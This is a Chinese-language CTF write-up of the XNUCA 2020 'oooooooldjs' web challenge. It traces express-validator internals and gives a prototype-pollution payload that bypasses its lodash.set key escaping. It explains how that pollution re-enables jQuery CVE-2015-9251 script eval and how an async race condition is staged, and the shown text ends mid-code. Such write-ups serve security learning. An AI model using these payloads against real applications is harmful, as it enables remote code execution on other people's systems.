&lt;h5 id="xnucactf-2020-qualifieroooooooldjs">[XNUCACTF 2020 Qualifier]oooooooldjs&lt;/h5>
&lt;p>这个题有三个考点，还是肥肠的难顶的&lt;/p>
&lt;ul>
&lt;li>原型链污染：lodash.set + express-validator&lt;/li>
&lt;li>异步bug&lt;/li>
&lt;li>jQuery RCE gadget&lt;/li>
&lt;/ul>
&lt;h6 id="express-validator的具体实现">express-validator的具体实现&lt;/h6>
&lt;p>我们以一段代码作为示例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">validationResult&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-validator&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">middlewares&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;*&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">middlewares&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/user&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;helloworld&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">,()=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`server listening on &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中第16行的&lt;code>body('*').trim()&lt;/code>是对validator这一中间件的设置，可以在&lt;code>node_modules\express-validator\src\middlewares\validation-chain-builders.js&lt;/code>中找到它的具体实现&lt;/p>
&lt;p>首先是对body, cookie, header, param, query这几个对象都是对&lt;code>buildCheckFunction(['xxxx'])&lt;/code>的封装，用来实现validator的功能&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223211308807.png" alt="image-20211223211308807">&lt;/p>
&lt;p>如果我们在第6行下断点 可以看到对应的参数在依次传入并返回，它其实是调用了&lt;code>node_modules\express-validator\src\middlewares\check.js&lt;/code>中&lt;code>check&lt;/code>的实现&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223213051362.png" alt="image-20211223213051362">&lt;/p>
&lt;p>先看返回值，&lt;code>Object.assign()&lt;/code>函数，首先是&lt;code>utils_1.bindall()&lt;/code>函数将传入对象的函数作为对象的一个属性进行绑定&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223213347228.png" alt="image-20211223213347228">&lt;/p>
&lt;p>之后再传入&lt;code>Object.assign&lt;/code>，将&lt;code>sanitizers&lt;/code>和&lt;code>validators&lt;/code>浅拷贝到&lt;code>middleware&lt;/code>上，就可以通过这个&lt;code>middleware&lt;/code>调用所有的验证和过滤函数&lt;/p>
&lt;p>之后进入&lt;code>express-validator\src\chain\context-runner-impl.js&lt;/code>看到&lt;code>trim()&lt;/code>，跟入调用&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223222949602.png" alt="image-20211223222949602">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223223012489.png" alt="image-20211223223012489">&lt;/p>
&lt;p>&lt;code>express-validator\src\context-builder.js&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223223052594.png" alt="image-20211223223052594">&lt;/p>
&lt;p>芜，竟然是一个入栈操作，把传入的值压入栈中&lt;/p>
&lt;p>回过头去看&lt;code>this.builder.addItem&lt;/code>，传入的是以&lt;code>trim&lt;/code>为参数的&lt;code>Sanitization&lt;/code>对象，为&lt;code>builder&lt;/code>增加一个&lt;code>sanitization&lt;/code>后返回&lt;code>this.chain&lt;/code>即&lt;code>middleware&lt;/code>，做到链式调用&lt;/p>
&lt;p>跟入这个&lt;code>Sanitization&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223231735649.png" alt="image-20211223231735649">&lt;/p>
&lt;p>&lt;code>run&lt;/code>方法中调用&lt;code>context.setData&lt;/code>来调用传入的&lt;code>sanitizer&lt;/code>修改新的值&lt;/p>
&lt;p>再往前，回到&lt;code>node_modules\express-validator\src\middlewares\check.js&lt;/code>，刚才我们只看了返回值，但它会先在第12行new一个&lt;code>ContextRunnerImpl&lt;/code>&lt;/p>
&lt;p>&lt;code>node_modules\express-validator\src\chain\context-runner-impl.js&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223232603577.png" alt="image-20211223232603577">&lt;/p>
&lt;p>它的&lt;code>run&lt;/code>方法在之前的第15行被调用，可以看作是&lt;code>middleware&lt;/code>调用的入口，这个&lt;code>run&lt;/code>先申请了一个&lt;code>context&lt;/code>（可以理解为http请求的上下文的一个封装），27行有一个for遍历，对于栈中的item（这个栈就是之前&lt;code>addItem&lt;/code>的栈）再依次调用它的&lt;code>run&lt;/code>方法&lt;/p>
&lt;p>究极套娃，总结整个逻辑就是这样的：&lt;/p>
&lt;p>首先将&lt;code>validator&lt;/code>和&lt;code>sanitizers&lt;/code>的方法绑定到&lt;code>check&lt;/code>函数返回的&lt;code>middleware&lt;/code>上，这些&lt;code>validator&lt;/code>和&lt;code>sanitizer&lt;/code>的方法是通过向&lt;code>context.stack&lt;/code>中push &lt;code>context-items&lt;/code>，最后在&lt;code>ContextRunnerImpl.run&lt;/code>方法里遍历栈中的items，逐一调用其&lt;code>run&lt;/code>方法实现&lt;code>validation&lt;/code>或&lt;code>sanitization&lt;/code>&lt;/p>
&lt;h6 id="结合lodashset扩大攻击面">结合lodash.set扩大攻击面&lt;/h6>
&lt;p>在上面分析的最后部分我们提到了实际调用时的for循环&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223232603577.png" alt="image-20211223232603577">&lt;/p>
&lt;p>45行有个if，如果满足&lt;code>options.dryRun&lt;/code>为空且&lt;code>reqValue!==instance.value&lt;/code>，就可以调用&lt;code>_.set&lt;/code>来重置&lt;code>req[location]&lt;/code>中的值为&lt;code>newValue&lt;/code>；而第一个默认是undefined不用管，而第二个，以&lt;code>trim&lt;/code>为例，如果传入的参数两边存在空白字符，经过&lt;code>trim&lt;/code>处理后就可以满足这个条件了&lt;/p>
&lt;p>这个&lt;code>_.set&lt;/code>正是我们的老朋友&lt;code>lodash.set&lt;/code>，尝试lodash.set的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">&amp;#34;__proto__.[whoami]&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz &amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>虽然满足了条件但并不能污染成功，在关键处打断点，定位到&lt;code>node_modules\express-validator\src\select-fields.js&lt;/code>（因为在&lt;code>ContextRunnerImpl.js&lt;/code>中的24行，在调用各种具体的&lt;code>run&lt;/code>方法之前先调用了&lt;code>this.selectFields&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224001541686.png" alt="image-20211224001541686">&lt;/p>
&lt;p>35行是一个&lt;code>*&lt;/code>的通配符，&lt;code>{&amp;quot;a&amp;quot;:{&amp;quot;b&amp;quot;:&amp;quot;123&amp;quot;}}&lt;/code>这样的body参数就会对b进行验证，但是如果是&lt;code>{&amp;quot;a.b&amp;quot;:&amp;quot;123&amp;quot;}&lt;/code>这样的，会将&lt;code>a.b&lt;/code>视作一个key，不会对&lt;code>a.b&lt;/code>进行验证，在传入&lt;code>express&lt;/code>时不会自动进行&lt;code>unfaltten&lt;/code>而变为一个a对象包含一个b对象；但&lt;code>express-validator&lt;/code>内部是通过lodash的&lt;code>_get&lt;/code>和&lt;code>_set&lt;/code>对对象进行赋值和取值，当传入&lt;code>a.b&lt;/code>时lodash会自动进行一个套娃（具体的前面已经写了），为了防止这种情况的出现，&lt;code>express-validator&lt;/code>对key进行检查，可以看到57行，出现&lt;code>.&lt;/code>就会在周围加一对方括号，起到转义作用&lt;/p>
&lt;p>所以我们传入的就会变成这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224112317775.png" alt="image-20211224112317775">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224112910994.png" alt="image-20211224112910994">&lt;/p>
&lt;p>在两端多了方括号，破坏了我们原来的payload，相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__.[whoami]&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;[\&amp;#34;__proto__.[whoami]\&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 多了方括号
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们要利用&lt;code>select-fileds&lt;/code>的一些转义的技巧来bypass&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;].__proto__[\&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;Vulnerable&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lodash&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;].__proto__[\&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Vulnerable&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;[\&amp;#34;\&amp;#34;].__proto__[\&amp;#34;whoami\&amp;#34;]&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造payload的时候还要注意&lt;code>lodash.set&lt;/code>，如果第二个参数path的值等于第一个参数object的键Key时会污染失败&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224004615093.png" alt="image-20211224004615093">&lt;/p>
&lt;p>可以污染原型顺利增加一个参数，但是它的参数却是一个空的字符串，原因是&lt;code>_set&lt;/code>时的第三个参数&lt;code>newValue&lt;/code>时利用变化后的key重新从&lt;code>req[location]&lt;/code>中取出来的，原本应该&lt;code>undefined&lt;/code>，但是我们经过&lt;code>Sanitization&lt;/code>的run方法时有一个&lt;code>toString&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224003615973.png" alt="image-20211224003615973">&lt;/p>
&lt;p>所以&lt;code>undefined&lt;/code>变为了空字符串&lt;code>''&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224003735423.png" alt="image-20211224003735423">&lt;/p>
&lt;p>经过了这一系列的处理，&lt;code>reqValue&lt;/code>为空就会经过&lt;code>_.get&lt;/code>重新取值，而这里得到的&lt;code>undefined&lt;/code>不会被&lt;code>toString&lt;/code>处理，在46行处&lt;code>undefined!==''&lt;/code>依旧为真，继续&lt;code>_.set&lt;/code>，进行原型链的污染&lt;/p>
&lt;p>虽然只能有限的进行污染一个空字符串，但是由于js的一些特性 比如在判断中&lt;code>''&lt;/code>返回false，我们可以把原本的地方的判断条件结果进行一些反转，从而绕过某些限制或改变代码走向（跟hitcon的那个翻转bit的思想有点像了&lt;/p>
&lt;h6 id="jquery的久远rce---cve-2015-9251">jQuery的久远rce - CVE-2015-9251&lt;/h6>
&lt;p>当&lt;code>jQuery&lt;/code>的url返回头的&lt;code>content-type&lt;/code>字段为&lt;code>text/javascript&lt;/code>时，即使没有设置&lt;code>dataType: 'script'&lt;/code>也会自动&lt;code>eval&lt;/code>返回内容&lt;/p>
&lt;p>这个漏洞做到了XSS-&amp;gt;RCE的效果，不过很早就修复了（jQuery 3.0.0），找到&lt;a href="https://github.dev/jquery/jquery/blob/5c2d08704e289dd2745bcb0557b35a9c0e6af4a4/src/ajax/script.js#L23">修复的代码&lt;/a>看能否绕过&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224140957720.png" alt="image-20211224140957720">&lt;/p>
&lt;p>通过&lt;code>s.crossDomain&lt;/code>来作为if判断的条件，如果为真则不会执行内容&lt;/p>
&lt;p>而这个&lt;code>s.CrossDomain&lt;/code>在默认设置中不存在；不过在jQuery初始化时用到了&lt;code>jQuery.ajaxExtend&lt;/code>这个函数，内部通过for遍历src的key &lt;a href="https://github.dev/jquery/jquery/blob/5c2d08704e289dd2745bcb0557b35a9c0e6af4a4/src/ajax/ajax.js#L115">链接在这里&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224152619790.png" alt="image-20211224152619790">&lt;/p>
&lt;p>会去找对象上不存在但原型链上存在的key，如果此时原型链被污染就会连带到target，示例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">polluted&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">keys&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// [ &amp;#39;polluted&amp;#39; ]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// { polluted: &amp;#39;&amp;#39; }
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>经过污染之后&lt;code>s.crossDomain=''&lt;/code>变为空字符串，在经过下面这个判断&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224153115106.png" alt="image-20211224153115106">&lt;/p>
&lt;p>在默认中的&lt;code>s.crossDomain&lt;/code>是undefined，而&lt;code>undefined==null&lt;/code>为true，所以在正常情况下可以进入这个判断，不过前面我们污染它为&lt;code>''&lt;/code>，于是这里保留空字符串不进入判断，并且上面的&lt;code>if(s.crossDomain)&lt;/code>也不会通过判断，导致&lt;code>s.content.script=true&lt;/code>，就可以rce了&lt;/p>
&lt;h6 id="异步编程的陷阱">***异步编程的陷阱&lt;/h6>
&lt;p>这块其实不是特别懂&lt;/p>
&lt;p>&lt;img src="https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022104530048.png" alt="image-20201022104530048">&lt;/p>
&lt;p>直接拿wp里的图了）这里的&lt;code>requests&lt;/code>是一个异步函数，在删除&lt;code>this.types&lt;/code>数组对应的项之后，由于异步函数的特性，&lt;code>express&lt;/code>不会等待&lt;code>requests&lt;/code>而是继续执行下面的代码，所以&lt;code>this.datas&lt;/code>中对应项的删除也会被对应的异步延后，这样一来在某一时刻会存在这样的情况&lt;/p>
&lt;p>&lt;img src="https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022121557273.png" alt="image-20201022121557273">&lt;/p>
&lt;p>我们可以利用异步函数导致的数据不一致发送一些恶意请求，构造&lt;code>this.types&lt;/code>和&lt;code>this.datas&lt;/code>中间一端像这个样子&lt;/p>
&lt;p>&lt;img src="https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022151504944.png" alt="image-20201022151504944">&lt;/p>
&lt;p>然后让题目访问我们自己的url；由于后端request请求的是本地环回速度很快，所以为了在&lt;code>dataRepo.D&lt;/code>中request没结束时构造好我们想要的数据形式，需要&lt;code>dataRepo.D&lt;/code>中requests耗时比我们构造的时间久，比如先post一些链表形式串起来的数据，比如&lt;/p>
&lt;p>&lt;img src="https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022131845955.png" alt="image-20201022131845955">&lt;/p>
&lt;p>然后再发起链表头数据的DELETE请求，让requests进行递归的删除，这样就可以通过这个链表的长度从而控制requests花费的时间，让requests耗费的时间符合我们的预期；链表的实际长度需要根据不同的网络状况进行调整&lt;/p>
&lt;h6 id="跨域问题">跨域问题&lt;/h6>
&lt;p>设置请求头时除了有&lt;code>text/javascript&lt;/code>以外还要另外设置允许跨域访问的请求头&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Access-Control-Allow-Origin&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
